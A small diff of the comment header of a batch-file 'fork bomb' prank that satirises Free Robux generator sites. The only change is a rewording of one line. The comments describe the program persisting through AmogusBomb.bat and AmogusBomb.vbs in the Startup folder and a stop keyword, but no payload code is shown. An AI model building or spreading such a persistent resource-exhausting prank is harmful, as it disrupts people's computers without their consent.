@@ -1,7 +1,7 @@
 REM Fork Bomb made by Sirapol B. on 11 October 2022
 REM Made for creating anxiety without much harm (I guess lol)
 REM This fork bomb is kinda a satire on those "Free Robux generator" websites on the internet
-REM Input "SrpB" in any of the spam boxes to stop the process
+REM Input "SrpB" in any of the input boxes to stop the process
 REM Make sure to delete AmogusBomb.bat and AmogusBomb.vbs inside Startup directory or else the problem will not be gone
 REM Written in Batch
 REM VirusTotal: https://www.virustotal.com/gui/file/93fd6442406fd021dfd512feebe999a20b07554f8984995daee6b89ab72a76e5
